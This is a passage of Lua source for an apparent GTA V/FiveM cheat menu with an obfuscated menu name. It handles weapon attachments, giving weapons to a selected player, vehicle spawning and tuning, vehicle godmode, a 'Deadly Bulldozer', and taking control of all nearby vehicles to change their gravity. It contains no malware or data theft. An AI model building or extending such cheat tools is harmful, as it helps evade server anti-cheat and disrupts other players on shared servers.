                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)

            elseif selPFuncIndex == 3 then
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)

            elseif selPFuncIndex == 4 then
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)

            elseif selPFuncIndex == 5 then
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)

            elseif selPFuncIndex == 6 then
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)

            elseif selPFuncIndex == 7 then
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)

            elseif selPFuncIndex == 8 then
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
            end
        elseif RPPPwdjwdU23.Button("~g~Add ~s~Special Finish") then
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
        elseif RPPPwdjwdU23.Button("~r~Remove ~s~Special Finish") then
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
        elseif RPPPwdjwdU23.Button("~g~Add ~s~Suppressor") then
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
        elseif RPPPwdjwdU23.Button("~r~Remove ~s~Suppressor") then
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
        elseif RPPPwdjwdU23.Button("~g~Add ~s~Scope") then
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
        elseif RPPPwdjwdU23.Button("~r~Remove ~s~Scope") then
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
        end
        
        -- MELEE WEAPON MENU
        elseif RPPPwdjwdU23.IsMenuOpened('melee') then
            for i = 1, #meleeweapons do
                if RPPPwdjwdU23.Button(meleeweapons[i][2]) then
                    GiveWeapon(selectedPlayer, meleeweapons[i][1])
                end
            end
        -- PISTOL MENU
        elseif RPPPwdjwdU23.IsMenuOpened('pistol') then
            for i = 1, #pistolweapons do
                if RPPPwdjwdU23.Button(pistolweapons[i][2]) then
                    GiveWeapon(selectedPlayer, pistolweapons[i][1])
                end
            end
        -- SMG MENU
        elseif RPPPwdjwdU23.IsMenuOpened('smg') then
            for i = 1, #smgweapons do
                if RPPPwdjwdU23.Button(smgweapons[i][2]) then
                    GiveWeapon(selectedPlayer, smgweapons[i][1])
                end
            end
        -- SHOTGUN MENU
        elseif RPPPwdjwdU23.IsMenuOpened('shotgun') then
            for i = 1, #shotgunweapons do
                if RPPPwdjwdU23.Button(shotgunweapons[i][2]) then
                    GiveWeapon(selectedPlayer, shotgunweapons[i][1])
                end
            end
        -- ASSAULT RIFLE MENU
        elseif RPPPwdjwdU23.IsMenuOpened('assault') then
            for i = 1, #assaultweapons do
                if RPPPwdjwdU23.Button(assaultweapons[i][2]) then
                    GiveWeapon(selectedPlayer, assaultweapons[i][1])
                end
            end
        -- SNIPER MENU
        elseif RPPPwdjwdU23.IsMenuOpened('sniper') then
            for i = 1, #sniperweapons do
                if RPPPwdjwdU23.Button(sniperweapons[i][2]) then
                    GiveWeapon(selectedPlayer, sniperweapons[i][1])
                end
            end
        -- THROWN WEAPON MENU
        elseif RPPPwdjwdU23.IsMenuOpened('thrown') then
            for i = 1, #thrownweapons do
                if RPPPwdjwdU23.Button(thrownweapons[i][2]) then
                    GiveWeapon(selectedPlayer, thrownweapons[i][1])
                end
            end
        -- HEAVY WEAPON MENU
        elseif RPPPwdjwdU23.IsMenuOpened('heavy') then
            for i = 1, #heavyweapons do
                if RPPPwdjwdU23.Button(heavyweapons[i][2]) then
                    GiveWeapon(selectedPlayer, heavyweapons[i][1])
                end
            end
        
        
        -- VEHICLE OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('vehicle') then
                    if RPPPwdjwdU23.MenuButton("Vehicle Spawner", 'vehiclespawner') then
                elseif RPPPwdjwdU23.MenuButton("Vehicle Mods", 'vehiclemods') then
                elseif RPPPwdjwdU23.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
                elseif RPPPwdjwdU23.CheckBox("Vehicle Godmode", VehGodmode) then
                    VehGodmode = not VehGodmode
				elseif RPPPwdjwdU23.ComboBox("Vehicle Functions >", {"Repair Vehicle", "Clean Vehicle", "Dirty Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selectedIndex)
                    currVFuncIndex = currentIndex
                    selVFuncIndex = currentIndex
                    end) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					RequestControlOnce(veh)
					if selVFuncIndex == 1 then
						FixVeh(veh)
						SetVehicleEngineOn(veh, 1, 1)
					elseif selVFuncIndex == 2 then
						SetVehicleDirtLevel(veh, 0)
					elseif selVFuncIndex == 3 then
						SetVehicleDirtLevel(veh, 15.0)
					end
                elseif RPPPwdjwdU23.CheckBox("Collision", Collision) then
                    Collision = not Collision
                elseif RPPPwdjwdU23.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                    currSpeedIndex = currentIndex
                    selSpeedIndex = currentIndex
                    SpeedModAmt = SpeedModOps[currSpeedIndex]

                    if SpeedModAmt == 1.0 then
                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
                    else
                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
                    end
                end) then
                    elseif RPPPwdjwdU23.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
                    EasyHandling = not EasyHandling
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    if not EasyHandling then
                        SetVehicleGravityAmount(veh, 9.8)
                    else
                        SetVehicleGravityAmount(veh, 30.0)
                    end
                    elseif RPPPwdjwdU23.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
                        DeadlyBulldozer = not DeadlyBulldozer
                        if DeadlyBulldozer then
                            local veh = SpawnVeh("BULLDOZER", 1, SpawnEngineOn)
                            SetVehicleCanBreak(veh, not DeadlyBulldozer)
                            SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
                            SetVehicleEnginePowerMultiplier(veh, 2500.0)
                            SetVehicleEngineTorqueMultiplier(veh, 2500.0)
                            SetVehicleEngineOn(veh, 1, 1, 1)
                            SetVehicleGravityAmount(veh, 50.0)
                            SetVehicleColours(veh, 27, 27)
                            ShowInfo("~r~Go forth and devour thy enemies!\nPress ~w~E ~r~to launch a minion!")
                        elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
                            DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                        end
                    end
        
        -- VEHICLE SPAWNER MENU
        elseif RPPPwdjwdU23.IsMenuOpened('vehiclespawner') then
            if RPPPwdjwdU23.Button("Spawn Vehicle By Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                SpawnVeh(model, PlaceSelf, SpawnEngineOn)
            elseif RPPPwdjwdU23.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
                PlaceSelf = not PlaceSelf
            elseif RPPPwdjwdU23.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
                SpawnInAir = not SpawnInAir
            elseif RPPPwdjwdU23.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
                SpawnEngineOn = not SpawnEngineOn
            elseif RPPPwdjwdU23.MenuButton('Compacts', 'compacts') then
            elseif RPPPwdjwdU23.MenuButton('Sedans', 'sedans') then
            elseif RPPPwdjwdU23.MenuButton('SUVs', 'suvs') then
            elseif RPPPwdjwdU23.MenuButton('Coupes', 'coupes') then
            elseif RPPPwdjwdU23.MenuButton('Muscle', 'muscle') then
            elseif RPPPwdjwdU23.MenuButton('Sports Classics', 'sportsclassics') then
            elseif RPPPwdjwdU23.MenuButton('Sports', 'sports') then
            elseif RPPPwdjwdU23.MenuButton('Super', 'super') then
            elseif RPPPwdjwdU23.MenuButton('Motorcycles', 'motorcycles') then
            elseif RPPPwdjwdU23.MenuButton('Off-Road', 'offroad') then
            elseif RPPPwdjwdU23.MenuButton('Industrial', 'industrial') then
            elseif RPPPwdjwdU23.MenuButton('Utility', 'utility') then
            elseif RPPPwdjwdU23.MenuButton('Vans', 'vans') then
			elseif RPPPwdjwdU23.MenuButton('Cycles', 'cycles') then
			elseif RPPPwdjwdU23.MenuButton('Boats', 'boats') then
			elseif RPPPwdjwdU23.MenuButton('Helicopters', 'helicopters') then
			elseif RPPPwdjwdU23.MenuButton('Planes', 'planes') then
			elseif RPPPwdjwdU23.MenuButton('Service/Emergency/Military', 'service') then
			elseif RPPPwdjwdU23.MenuButton('Commercial/Trains', 'commercial') then
			end
        
        -- COMPACTS SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('compacts') then
            for i = 1, #compacts do
                local vehname = GetLabelText(compacts[i])
                if vehname == "NULL" then vehname = compacts[i] end 
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SEDANS SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('sedans') then
            for i = 1, #sedans do
                local vehname = GetLabelText(sedans[i])
                if vehname == "NULL" then vehname = sedans[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUVs SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('suvs') then
            for i = 1, #suvs do
                local vehname = GetLabelText(suvs[i])
                if vehname == "NULL" then vehname = suvs[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COUPES SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('coupes') then
            for i = 1, #coupes do
                local vehname = GetLabelText(coupes[i])
                if vehname == "NULL" then vehname = coupes[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- MUSCLE SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('muscle') then
            for i = 1, #muscle do
                local vehname = GetLabelText(muscle[i])
                if vehname == "NULL" then vehname = muscle[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTSCLASSICS SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('sportsclassics') then
            for i = 1, #sportsclassics do
                local vehname = GetLabelText(sportsclassics[i])
                if vehname == "NULL" then vehname = sportsclassics[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTS SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('sports') then
            for i = 1, #sports do
                local vehname = GetLabelText(sports[i])
                if vehname == "NULL" then vehname = sports[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUPER SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('super') then
            for i = 1, #super do
                local vehname = GetLabelText(super[i])
                if vehname == "NULL" then vehname = super[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(super[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- MOTORCYCLES SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('motorcycles') then
            for i = 1, #motorcycles do
                local vehname = GetLabelText(motorcycles[i])
                if vehname == "NULL" then vehname = motorcycles[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(motorcycles[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- OFFROAD SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('offroad') then
            for i = 1, #offroad do
                local vehname = GetLabelText(offroad[i])
                if vehname == "NULL" then vehname = offroad[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- INDUSTRIAL SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('industrial') then
            for i = 1, #industrial do
                local vehname = GetLabelText(industrial[i])
                if vehname == "NULL" then vehname = industrial[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- UTILITY SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('utility') then
            for i = 1, #utility do
                local vehname = GetLabelText(utility[i])
                if vehname == "NULL" then vehname = utility[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VANS SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('vans') then
            for i = 1, #vans do
                local vehname = GetLabelText(vans[i])
                if vehname == "NULL" then vehname = vans[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- CYCLES SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('cycles') then
            for i = 1, #cycles do
                local vehname = GetLabelText(cycles[i])
                if vehname == "NULL" then vehname = cycles[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- BOATS SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('boats') then
            for i = 1, #boats do
                local vehname = GetLabelText(boats[i])
                if vehname == "NULL" then vehname = boats[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- HELICOPTERS SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('helicopters') then
            for i = 1, #helicopters do
                local vehname = GetLabelText(helicopters[i])
                if vehname == "NULL" then vehname = helicopters[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- PLANES SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('planes') then
            for i = 1, #planes do
                local vehname = GetLabelText(planes[i])
                if vehname == "NULL" then vehname = planes[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
                end
            end
        
        -- SERVICE SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('service') then
            for i = 1, #service do
                local vehname = GetLabelText(service[i])
                if vehname == "NULL" then vehname = service[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(service[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COMMERCIAL SPAWNER
        elseif RPPPwdjwdU23.IsMenuOpened('commercial') then
            for i = 1, #commercial do
                local vehname = GetLabelText(commercial[i])
                if vehname == "NULL" then vehname = commercial[i] end
                local carButton = RPPPwdjwdU23.Button(vehname)
                if carButton then
                    SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VEHICLE MODS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('vehiclemods') then
            if RPPPwdjwdU23.MenuButton("Vehicle Colors", 'vehiclecolors') then
                elseif RPPPwdjwdU23.MenuButton("Tune Vehicle", 'vehicletuning') then
                elseif RPPPwdjwdU23.Button("~p~Set Plate Text (8 Characters)") then
                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                    RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                    SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)
                elseif RPPPwdjwdU23.Button('Flip Vehicle', '~g~:)))') then
                    SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))
             end
        
        -- VEHICLE COLORS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('vehiclecolors') then
            if RPPPwdjwdU23.MenuButton("Primary Color", 'vehiclecolors_primary') then
                elseif RPPPwdjwdU23.MenuButton("Secondary Color", 'vehiclecolors_secondary') then
                
            end
        
        elseif RPPPwdjwdU23.IsMenuOpened('vehiclecolors_primary') then
            if RPPPwdjwdU23.MenuButton("Classic Colors", 'primary_classic') then
                elseif RPPPwdjwdU23.MenuButton("Matte Colors", 'primary_matte') then
                elseif RPPPwdjwdU23.MenuButton("Metals", 'primary_metal') then
            end
        
        elseif RPPPwdjwdU23.IsMenuOpened('vehiclecolors_secondary') then
            if RPPPwdjwdU23.MenuButton("Classic Colors", 'secondary_classic') then
                elseif RPPPwdjwdU23.MenuButton("Matte Colors", 'secondary_matte') then
                elseif RPPPwdjwdU23.MenuButton("Metals", 'secondary_metal') then
            end
        
        -- PRIMARY CLASSIC
        elseif RPPPwdjwdU23.IsMenuOpened('primary_classic') then
            for i = 1, #classicColors do
                if RPPPwdjwdU23.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, classicColors[i][2], sec)
                end
            end
        
        -- PRIMARY MATTE
        elseif RPPPwdjwdU23.IsMenuOpened('primary_matte') then
            for i = 1, #matteColors do
                if RPPPwdjwdU23.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, matteColors[i][2], sec)
                end
            end
        
        -- PRIMARY METAL
        elseif RPPPwdjwdU23.IsMenuOpened('primary_metal') then
            for i = 1, #metalColors do
                if RPPPwdjwdU23.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, metalColors[i][2], sec)
                end
            end
        
        -- SECONDARY CLASSIC
        elseif RPPPwdjwdU23.IsMenuOpened('secondary_classic') then
            for i = 1, #classicColors do
                if RPPPwdjwdU23.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, classicColors[i][2])
                end
            end
        
        -- SECONDARY MATTE
        elseif RPPPwdjwdU23.IsMenuOpened('secondary_matte') then
            for i = 1, #matteColors do
                if RPPPwdjwdU23.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, matteColors[i][2])
                end
            end
        
        -- SECONDARY METAL
        elseif RPPPwdjwdU23.IsMenuOpened('secondary_metal') then
            for i = 1, #metalColors do
                if RPPPwdjwdU23.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, metalColors[i][2])
                end
            end
        
        -- VEHICLE TUNING MENU
        elseif RPPPwdjwdU23.IsMenuOpened('vehicletuning') then
        if RPPPwdjwdU23.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Vehicle Neon", ou328hNeon) then
            ou328hNeon = not ou328hNeon

        elseif RPPPwdjwdU23.Button("~h~~b~------vehicletuning------") then
    elseif RPPPwdjwdU23.Button("Max ~r~Exterior Tuning") then
                MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
            elseif RPPPwdjwdU23.Button("~h~~b~------vehicletuning------") then
    elseif RPPPwdjwdU23.Button("Max ~r~Performance") then
                engine(GetVehiclePedIsUsing(PlayerPedId()))
            elseif RPPPwdjwdU23.Button("~h~~b~------vehicletuning------") then
    elseif RPPPwdjwdU23.Button("Max All ~r~Tuning") then
                engine1(GetVehiclePedIsUsing(PlayerPedId()))
    end
                
        
        -- VEHICLE MENU (WIP)
        elseif RPPPwdjwdU23.IsMenuOpened('vehiclemenu') then
            if RPPPwdjwdU23.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
                if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
					SavedVehicle = not SavedVehicle
					RemoveBlip(pvblip)
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvblip = AddBlipForEntity(pvehicle)
					SetBlipSprite(pvblip, 225)
					SetBlipColour(pvblip, 84) 
					ShowInfo("~g~Current Vehicle Saved")
					pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
                elseif SavedVehicle then
					SavedVehicle = not SavedVehicle
					pvehicle = nil
                    RemoveBlip(pvblip)
					ShowInfo("~b~Saved Vehicle Blip Removed")
				else
					ShowInfo("~r~You are not in a vehicle!")
                end


            elseif RPPPwdjwdU23.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
                LeftFrontDoor = not LeftFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftFrontDoor then
                    SetVehicleDoorOpen(vehicle, 0, nil, true)
                elseif not LeftFrontDoor then
                    SetVehicleDoorShut(vehicle, 0, true)
                end
            elseif RPPPwdjwdU23.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then 
                RightFrontDoor = not RightFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightFrontDoor then
					SetVehicleDoorOpen(vehicle, 1, nil, true)
                elseif not RightFrontDoor then
					SetVehicleDoorShut(vehicle, 1, true)
                end
            elseif RPPPwdjwdU23.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
                LeftBackDoor = not LeftBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftBackDoor then
					SetVehicleDoorOpen(vehicle, 2, nil, true)
                elseif not LeftBackDoor then
					SetVehicleDoorShut(vehicle, 2, true)
                end
            elseif RPPPwdjwdU23.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
                RightBackDoor = not RightBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightBackDoor then
					SetVehicleDoorOpen(vehicle, 3, nil, true)
                elseif not RightBackDoor then
					SetVehicleDoorShut(vehicle, 3, true)
                end
            elseif RPPPwdjwdU23.CheckBox("Hood", FrontHood, "Closed", "Opened") then
                FrontHood = not FrontHood
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if FrontHood then
					SetVehicleDoorOpen(vehicle, 4, nil, true)
                elseif not FrontHood then
					SetVehicleDoorShut(vehicle, 4, true)
                end
            elseif RPPPwdjwdU23.CheckBox("Trunk", Trunk, "Closed", "Opened") then
                Trunk = not Trunk
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Trunk then
					SetVehicleDoorOpen(vehicle, 5, nil, true)
                elseif not Trunk then
					SetVehicleDoorShut(vehicle, 5, true)
                end
            elseif RPPPwdjwdU23.CheckBox("Back", Back, "Closed", "Opened") then
                Back = not Back
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back then
					SetVehicleDoorOpen(vehicle, 6, nil, true)
                elseif not Back then
					SetVehicleDoorShut(vehicle, 6, true)
                end
            elseif RPPPwdjwdU23.CheckBox("Back 2", Back2, "Closed", "Opened") then
                Back2 = not Back2
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back2 then
					SetVehicleDoorOpen(vehicle, 7, nil, true)
                elseif not Back2 then
					SetVehicleDoorShut(vehicle, 7, true)
                end
            end

        -- WORLD OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('world') then
            if RPPPwdjwdU23.MenuButton("Object Spawner", 'objectspawner') then
            elseif RPPPwdjwdU23.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
            elseif RPPPwdjwdU23.MenuButton("Time Changer", 'time') then
            elseif RPPPwdjwdU23.Button("Set All Nearby Vehicles Plate Text") then
            elseif RPPPwdjwdU23.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
                currGravIndex = currentIndex
                selGravIndex = currentIndex
                GravAmount = GravityOps[currGravIndex]

                for k in EnumerateVehicles() do
                    RequestControlOnce(k)
                    SetVehicleGravityAmount(k, GravAmount)
                end
            end) then
